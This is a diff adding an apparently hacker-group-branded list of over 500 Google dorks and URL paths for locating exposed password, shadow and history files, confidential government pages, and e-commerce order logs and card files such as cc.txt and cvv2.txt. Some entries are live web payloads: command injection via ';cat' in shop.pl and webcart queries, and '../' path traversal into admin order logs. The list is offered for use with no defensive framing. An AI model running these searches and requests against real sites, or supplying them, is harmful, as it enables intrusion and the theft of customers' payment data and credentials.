@@ -1,0 +1,520 @@
+Created By SHADOVVS™
+
+WWW.ASHIYANE.ORG
+
+
+1.“Index of /admin”
+2. “Index of /password”
+3. “Index of /mail”
+4. “Index of /” +passwd
+5. “Index of /” +password.txt
+6. “Index of /” +.htaccess
+7. index of ftp +.mdb allinurl:/cgi-bin/ +mailto
+8. administrators.pwd.index
+9. authors.pwd.index
+10. service.pwd.index
+11. filetype:config web
+12. gobal.asax index
+13. allintitle: “index of/admin”
+14. allintitle: “index of/root”
+15. allintitle: sensitive filetype:doc
+16. allintitle: restricted filetype :mail
+17. allintitle: restricted filetype:doc site:gov
+18. inurlasswd filetype:txt
+19. inurl:admin filetype:db
+20. inurl:iisadmin
+21. inurl:”auth_user_file.txt”
+22. inurl:”wwwroot/*.”
+23. top secret site:mil
+24. confidential site:mil
+25. allinurl: winnt/system32/ (get cmd.exe)
+26. allinurl:/bash_history
+27. intitle:”Index of” .sh_history
+28. intitle:”Index of” .bash_history
+29. intitle:”index of” passwd
+30. intitle:”index of” people.lst
+31. intitle:”index of” pwd.db
+32. intitle:”index of” etc/shadow
+33. intitle:”index of” spwd
+34. intitle:”index of” master.passwd
+35. intitle:”index of” htpasswd
+36. intitle:”index of” members OR accounts
+37. intitle:”index of” user_carts OR user_cart
+
+38. Below dorks you can use them with inurl filter
+
+39. _vti_inf.html
+40. service.pwd
+41. users.pwd
+42. authors.pwd
+43. administrators.pwd
+44. shtml.dll
+45. shtml.exe
+46. fpcount.exe
+47. default.asp
+48. showcode.asp
+49. sendmail.cfm
+50. getFile.cfm
+51. imagemap.exe
+52. test.bat
+53. msadcs.dll
+54. htimage.exe
+55. counter.exe
+56. browser.inc
+57. hello.bat
+58. default.aspdvwssr.dll
+59. cart32.exe
+60. add.exe
+61. index.jsp
+62. SessionServlet
+63. shtml.dll
+64. index.cfm
+65. page.cfm
+66. shtml.exe
+67. web_store.cgi
+68. shop.cgi
+69. upload.asp
+70. default.asp
+71. pbserver.dll
+72. phf
+73. test-cgi
+74. finger
+75. Count.cgi
+76. jj
+77. php.cgi
+78. php
+79. nph-test-cgi
+80. handler
+81. webdist.cgi
+82. webgais
+83. websendmail
+84. faxsurvey
+85. htmlscript
+86. perl.exe
+87. wwwboard.pl
+88. www-sql
+89. view-source
+90. campas
+91. aglimpse
+92. glimpse
+93. man.sh
+94. AT-admin.cgi
+95. AT-generate.cgi
+96. filemail.pl
+97. maillist.pl
+98. info2www
+99. files.pl
+100. bnbform.cgi
+101. survey.cgi
+102. classifieds.cgi
+103. wrap
+104. cgiwrap
+105. edit.pl
+106. perl
+107. names.nsf
+108. webgais
+109. dumpenv.pl
+110. test.cgi
+111. submit.cgi
+112. guestbook.cgi
+113. guestbook.pl
+114. cachemgr.cgi
+115. responder.cgi
+116. perlshop.cgi
+117. query
+118. w3-msql
+119. plusmail
+120. htsearch
+121. infosrch.cgi
+122. publisher
+123. ultraboard.cgi
+124. db.cgi
+125. formmail.cgi
+126. allmanage.pl
+127. ssi
+128. adpassword.txt
+129. redirect.cgi
+130. cvsweb.cgi
+131. login.jsp
+132. dbconnect.inc
+133. admin
+134. htgrep
+135. wais.pl
+136. amadmin.pl
+137. subscribe.pl
+138. news.cgi
+139. auctionweaver.pl
+140. .htpasswd
+141. acid_main.php
+142. access.log
+143. log.htm
+144. log.html
+145. log.txt
+146. logfile
+147. logfile.htm
+148. logfile.html
+149. logfile.txt
+150. logger.html
+151. stat.htm
+152. stats.htm
+153. stats.html
+154. stats.txt
+155. webaccess.htm
+156. wwwstats.html
+157. source.asp
+158. perl
+159. mailto.cgi
+160. YaBB.pl
+161. mailform.pl
+162. cached_feed.cgi
+163. global.cgi
+164. Search.pl
+165. build.cgi
+166. common.php
+167. show
+168. global.inc
+169. ad.cgi
+170. WSFTP.LOG
+171. index.html~
+172. index.php~
+173. index.html.bak
+174. index.php.bak
+175. print.cgi
+176. register.cgi
+177. webdriver
+178. bbs_forum.cgi
+179. mysql.class
+180. sendmail.inc
+181. CrazyWWWBoard.cgi
+182. search.pl
+183. way-board.cgi
+184. webpage.cgi
+185. pwd.dat
+186. adcycle
+187. post-query
+188. help.cgi
+189. /robots.txt
+190. /admin.mdb
+191. /shopping.mdb
+192. /arg;
+193. /stats/styles.css
+194. /statshelp.htm
+195. /favicon.ico
+196. /stats/admin.mdb
+197. /shopdbtest.asp
+198. /cgi-bin/test.cgi
+199. /cgi-bin/test.pl
+200. /cgi-bin/env.cgi
+201. /photos/protest/styles.css
+202. http://hpcgi1.nifty.com/trino/ProxyJ/prxjdg.cgi
+203. /cgi-bin/whereami.cgi
+204. /shopping400.mdb
+205. /cgi/test.cgi
+206. /cgi-bin/test2.pl
+207. /photos/protest/kingmarch_02.html
+208. /chevy/index.htm
+209. /cgi-bin/glocation.cgi
+210. /cgi-bin/test2.cgi
+211. /ccbill/glocation.cgi
+212. /cgi-bin/styles.css
+213. /shopping350.mdb
+214. /cgi-bin/shopper.cgi
+215. /shopadmin.asp
+216. /news_2003-02-27.htm
+217. /cgi-bin/whois.cgi
+218. 3 /cgi-bin/calendar.pl
+219. 3 /cgi-bin/calendar/calendar.pl
+220. 3 /cgibin/styles.css
+221. 3 /venem.htm
+222. 2 /stats/www.newbauersflowers.com/stats/04-refers.htm
+223. 2 /cgi-bin/where.pl
+224. 2 /cgibin/shopper.cgi&TEMPLATE=ORDER.LOG
+225. 2 /cgibin/recon.cgi
+226. 2 /cgibin/test.cgi
+227. 2 /WebShop/templates/styles.css
+228. 2 /stats/shopping350.mdb
+229. 2 /cgi-bin/mailform.cgi
+230. 2 /cgi-bin/recon.cgi
+231. 2 /chevy
+232. 2 /cgi-bin/servinfo.cgi
+233. 2 /acart2_0.mdb
+234. 2 /cgi-bin/where.cgi
+235. 2 /chevy/
+236. 2 /stats/www.savethemall.net/stats/19-refers.htm
+237. 2 /ccbill/secure/ccbill.log
+238. 2 /cgi/recon.cgi
+239. 2 /stats/www.gregoryflynn.com/chevy
+240. 2 /ibill/glocation.cgi
+241. 2 /ccbill/whereami.cgi
+242. 2 /ibill/whereami.cgi
+243. 2 /apps_trial.htm
+244. 2 /cgi-bin/lancelot/recon.cgi
+245. 2 /cgi-bin/DCShop/Orders/styles.css
+246. 1 /cgi-bin/htmanage.cgi
+247. 1 /stats/www.tysons.net/stats/05-refers.htm
+248. 1 /cgi-bin/mastergate/add.cgi
+249. 1 /cgi-bin/openjournal.cgi
+250. 1 /cgi-bin/calendar/calendar_admin.pl
+251. 1 /cgibin/ibill/count.cgi
+252. 1 /cgi-bin/nbmember2.cgi
+253. 1 /cgi-bin/mastergate/count.cgi
+254. 1 /cgi-bin/mastergate/accountcreate.cgi
+255. 1 /cgi-bin/ibill/accountcreate.cgi
+256. 1 /cgibin/MasterGate2/count.cgi
+257. 1 /cgi-bin/amadmin.pl
+258. 1 /cgibin/mailform.cgi
+259. 1 /cgibin/mastergate/count.cgi
+260. 1 /cgibin/harvestor.cgi
+261. 1 /cgibin/igate/count.cgi
+262. 1 /WebShop
+263. 1 /shopdisplaycategories.asp
+264. 1 /cgi-bin/DCShop/Orders/orders.txt
+265. 1 /cgi-bill/revshare/joinpage.cgi
+266. 1 /stats/www.gregoryflynn.com/stats/19-refers.htm
+267. 1 /cgi-local/DCShop/auth_data/styles.css
+268. 1 /cgi-bin/add-passwd.cgi
+269. 1 /cgi-bin/MasterGate/count.cgi
+270. 1 /apps_shop.htm%%20/comersus/database/comersus.mdb
+271. 1 /data/verotellog.txt
+272. 1 /epwd/ws_ftp.log
+273. 1 /stats/www.dialacure.com/stats/16-refers.htm
+274. 1 /cgi/MasterGate2/count.cgi
+275. 1 /jump/rsn.tmus/skybox;sz=140×150;segment=all;resor=jackson;state= WY;sect=home;tile=8;ord=57019
+276. 1 /wwii/styles.css
+277. 1 /cgi-bin/admin.mdb
+278. 1 /stats/www.gregoryflynn.com/stats/31-refers.htm
+279. 1 /cgi-bin/ibill-tools/count.cgi
+280. 1 /WebShop/templates/cc.txt
+281. 1 /cgibin/ibill/accountcreate.cgi
+282. 1 /cgi-bin/count.cgi
+283. 1 /cgi-local/DCShop/auth_data/auth_user_file.txt
+284. 1 /cgi/mastergate/count.cgi
+285. 1 /cgi-bin/EuroDebit/addusr.pl
+286. 1 /cgi-bin/dbm-passwd.cgi
+287. 1 /cgi/igate/accountcreate.cgi
+288. 1 /cgi-bin/store/Log_files/your_order.log
+289. store/log_files/your_order.log
+290. /cgi-bin/DCShop/Orders/orders.txt
+291. /vpasp/shopdbtest.asp
+292. /orders/checks.txt
+293. /WebShop/logs
+294. /ccbill/secure/ccbill.log
+295. /scripts/cart32.exe
+296. /cvv2.txt
+297. /cart/shopdbtest.asp
+298. /cgi-win/cart.pl
+299. /shopdbtest.asp
+300. /WebShop/logs/cc.txt
+301. /cgi-local/cart.pl
+302. /PDG_Cart/order.log
+303. /config/datasources/expire.mdb
+304. /cgi-bin/ezmall2000/mall2000.cgi?page=../mall_log_files/order.loghtml
+305. /orders/orders.txt
+306. /cgis/cart.pl
+307. /webcart/carts
+308. /cgi-bin/cart32.exe/cart32clientlist
+309. /cgi/cart.pl
+310. /comersus/database/comersus.mdb
+311. /WebShop/templates/cc.txt
+312. /Admin_files/order.log
+313. /orders/mountain.cfg
+314. /cgi-sys/cart.pl
+315. /scripts/cart.pl
+316. /htbin/cart.pl
+317. /productcart/database/EIPC.mdb
+318. /shoponline/fpdb/shop.mdb
+319. /config/datasources/myorder.mdb
+320. /PDG_Cart/shopper.conf
+321. /shopping/database/metacart.mdb
+322. /bin/cart.pl
+323. /cgi-bin/cart32.ini
+324. /database/comersus.mdb
+325. /cgi-local/medstore/loadpage.cgi?user_id=id&file=data/orders.txt
+326. /cgi-bin/store/Admin_files/myorderlog.txt
+327. /cgi-bin/orders.txt
+328. /cgi-bin/store/Admin_files/your_order.log
+329. /test/test.txt
+330. /fpdb/shop.mdb
+331. /cgibin/shop/orders/orders.txt
+332. /shopadmin1.asp
+333. /cgi-bin/shop.cgi
+334. /cgi-bin/commercesql/index.cgi?page=../admin/manager.cgi
+335. /cgi-bin/PDG_cart/card.txt
+336. /shopper.cgi?preadd=action&key=PROFA&template=order1.log
+337. /store/shopdbtest.asp
+338. /log_files/your_order.log
+339. /_database/expire.mdb
+340. /HyperStat/stat_what.log
+341. /cgibin/DCShop/auth_data/auth_user_file.txt
+342. /htbin/orders/orders.txt
+343. /SHOP/shopadmin.asp
+344. /index.cgi?page=../admin/files/order.log
+345. /vpshop/shopadmin.asp
+346. /webcart/config
+347. /PDG/order.txt
+348. /cgi-bin/shopper.cgi
+349. /orders/order.log
+350. /orders/db/zzzbizorders.log.html
+351. /easylog/easylog.html
+352. /cgi-bin/store/Log_files/your_order.log
+353. /cgi-bin/%%20shopper.cgi?preadd=action&key=PROFA&template=shopping400.mdb
+354. /comersus_message.asp?
+355. /orders/import.txt
+356. /htbin/DCShop/auth_data/auth_user_file.txt
+357. /admin/html_lib.pl
+358. /cgi-bin/%%20shopper.cgi?preadd=action&key=PROFA&template=myorder.txt
+359. /cgi-bin/DCShop/auth_data/auth_user_file.txt
+360. /cgi-bin/shop.pl/page=;cat%%20shop.pl
+361. /cgi-bin/shopper?search=action&keywords=dhenzuser%%20&template=order.log
+362. /HBill/htpasswd
+363. /bin/shop/auth_data/auth_user_file.txt
+364. /cgi-bin/cs/shopdbtest.asp
+365. /mysql/shopping.mdb
+366. /Catalog/config/datasources/Products.mdb
+367. /trafficlog
+368. /cgi/orders/orders.txt
+369. /cgi-local/PDG_Cart/shopper.conf
+370. /store/cgi-bin/Admin_files/expire.mdb
+371. /derbyteccgi/shopper.cgi?key=SC7021&preadd=action&template=order.log
+372. /derbyteccgi/shopper.cgi?search=action&keywords=moron&template=order.log
+373. /cgi-bin/mc.txt
+374. /cgi-bin/mall2000.cgi
+375. /cgi-win/DCShop/auth_data/auth_user_file.txt
+376. /cgi-bin/shopper.cgi?search=action&keywords=root%%20&template=order.log
+377. /store/commerce.cgi
+378. /scripts/shop/orders/orders.txt
+379. /product/shopping350.mdb
+380. /super_stats/access_logs
+381. /cgi-local/orders/orders.txt
+382. /cgi-bin/PDG_Cart/mc.txt
+383. /cgibin/cart32.exe
+384. /cgi-bin/Shopper.exe?search=action&keywords=psiber%%20&template=other/risinglogorder.log
+385. /cgibin/password.txt
+386. /Catalog/cart/carttrial.dat
+387. /catalog/Admin/Admin.asp
+388. /ecommerce/admin/user/admin.asp
+389. /data/productcart/database/EIPC.mdb
+390. /store/admin_files/commerce_user_lib.pl
+391. /cgi-bin/store/index.cgi
+392. /paynet.txt
+393. /config/datasources/store/billing.mdb
+394. /_database/shopping350.mdb
+395. /cgi-bin/shopper.exe?search
+396. /cgi/shop.pl/page=;cat%%20shop.pl
+397. /cgi-bin/store/Admin_files/orders.txt
+398. /cgi-bin/store/commerce_user_lib.pl
+399. /cgi-sys/pagelog.cgi
+400. /cgi-sys/shop.pl/page=;cat%%20shop.pl
+401. /scripts/weblog
+402. /fpdb/shopping400.mdb
+403. /htbin/shop/orders/orders.txt
+404. /cgi-bin/%%20shopper.cgi?preadd=action&key=PROFA&template=myorder.log
+405. /cgi-bin/shopper.exe?search=action&keywords=psiber&template=order.log
+406. /mall_log_files/
+407. /cgi-bin/perlshop.cgi
+408. /tienda/shopdbtest.asp
+409. /cgi-bin/%%20shopper.cgi?preadd=action&key=PROFA&template=shopping.mdb
+410. /cgi-bin/shopper.cgi?search=action&keywords=whinhall&template=order.log
+411. /WebShop/logs/ck.log
+412. /fpdb/shopping300.mdb
+413. /mysql/store.mdb
+414. /cgi-bin/store/Admin_files/commerce_user_lib.pl
+415. /config.dat
+416. /order/order.log
+417. /commerce_user_lib.pl
+418. /Admin_files/AuthorizeNet_user_lib.pl
+419. /cvv2.asp
+420. /cgi-bin/cart32/CART32-order.txt
+421. /wwwlog
+422. /cool-logs/mlog.html
+423. /cgi-bin/pass/merchant.cgi.log
+424. /cgi-local/pagelog.cgi
+425. /cgi-bin/pagelog.cgi
+426. /cgi-bin/orders/cc.txt
+427. /cgis/shop/orders/orders.txt
+428. /admin/admin_conf.pl
+429. /cgi-bin/pdg_cart/order.log
+430. /cgi/PDG_Cart/order.log
+431. /Admin_files/ccelog.txt
+432. /cgi-bin/orders/mc.txt
+433. /cgi/cart32.exe
+434. /ecommerce/admin/admin.asp
+435. /scripts/DCShop/auth_data/auth_user_file.txt
+436. /Catalog/config/datasources/Expire.mdb
+437. /ecommerce/admin/shopdbtest.asp
+438. /mysql/mystore.mdb
+439. /cgi-bin/%%20shopper.cgi?preadd=action&key=PROFA&template=shopping.asp
+440. /cgi-bin/commercesql/index.cgi?page=../admin/files/order.log
+441. /cgi-bin/Count.cgi?df=callcard.dat
+442. /logfiles/
+443. /shopping/shopping350.mdb
+444. /admin/configuration.pl
+445. /cgis/DCShop/auth_data/auth_user_file.txt
+446. /cgis/cart32.exe
+447. /cgi-bin/dcshop.cgi
+448. /cgi-win/shop/auth_data/auth_user_file.txt
+449. /shopping400.mdb
+450. /HBill/config
+451. /cgi-bin/shop/index.cgi?page=../admin/files/order.log
+452. /search=action&keywords=GSD%%20&template=order.log
+453. /WebCart/orders.txt
+454. /PDG_Cart/authorizenets.txt
+455. /cgi-bin/AnyForm2
+456. /~gcw/cgi-bin/Count.cgi?df=callcard.dat
+457. /cgi-bin/PDG_Cart/order.log
+458. /expire.mdb
+459. /logger/
+460. /webcart-lite/orders/import.txt
+461. /cgi-bin/commercesql/index.cgi?page=../admin/admin_conf.pl
+462. /cgi-bin/PDG_Cart/shopper.conf
+463. /cgi-bin/cart32.exe
+464. /dc/orders/orders.txt
+465. /cgi-local/DCShop/orders/orders.txt
+466. /shop.pl/page=shop.cfg
+467. /cgi-local/cart32.exe
+468. /cgi-win/pagelog.cgi
+469. /cgi-win/shop/orders/orders.txt
+470. /cgibin/shopper.cgi?search=action&keywords=moron&template=order.csv
+471. /cgi-sys/DCShop/auth_data/auth_user_file.txt
+472. /cgi-bin/www-sql;;;
+473. /cgi-bin/%%20shopper.cgi?preadd=action&key=PROFA&template=order.log
+474. /scripts/orders/orders.txt
+475. /cgi-local/shop.pl/shop.cfg
+476. /search=action&keywords=cwtb%%20&template=expire.mdb
+477. /php/mylog.phtml
+478. /config/datasources/shopping.mdb
+479. /php-coolfile/action.php?action=edit&file=config.php
+480. /cgi-bin/ezmall2000/mall2000.cgi
+481. /cgi/DCShop/orders/orders.txt
+482. /cgi-local/shop.pl
+483. /cgis/DCShop/orders/orders.txt
+484. /product/shopdbtest.asp
+485. /ASP/cart/database/metacart.mdb
+486. /cgi-bin/cgi-lib.pl
+487. /cgi-bin/mailview.cgi?cmd=view&fldrname=inbox&select=1&html
+488. /search=action&keywords=cwtb%%20&template=order.log
+489. /mysql/expire.mdb
+490. /scripts/shop/auth_data/auth_user_file.txt
+491. /cgi-bin/cart32/whatever-OUTPUT.txt
+492. /Shopping%%20Cart/shopdbtest.asp
+493. /cgi/shop/auth_data/auth_user_file.txt
+494. /shop/shopping350.mdb
+495. /cgi-bin/store/Authorize_Net.pl
+496. /scripts/DCShop/orders/orders.txt
+497. /store/log_files/commerce_user_lib.pl
+498. /shopping/shopadmin.asp
+499. /cgi-bin/orderlog.txt
+500. /cgi-bin/webcart/webcart.cgi?CONFIG=mountain&CHANGE=YES&NEXTPAGE=;cat%%20../../webcart/system/orders/orders.txt|&CODE=PHOLD;;;
+501. /cool-logs/mylog.html
+502. /cgibin/shop.pl/page=;cat%%20shop.pl
+503. /htbin/shop.pl/page=;cat%%20shop.pl
+504. /cgi-win/orders/orders.txt
+505. /cgi-bin/%%20shopper.cgi?preadd=action&key=PROFA&template=order1.txt
+506. /SHOP/shopdbtest.asp
+507. /cgi/pagelog.cgi
+508. /php/mlog.phtml
+509. /cgi-bin/shop/apdproducts.mdb
+510. /htbin/shop/auth_data/auth_user_file.txt
+511. /server%%20logfile;;;
+512. /database/metacart.mdb
+513. /cgi-local/shop/orders/orders.txt
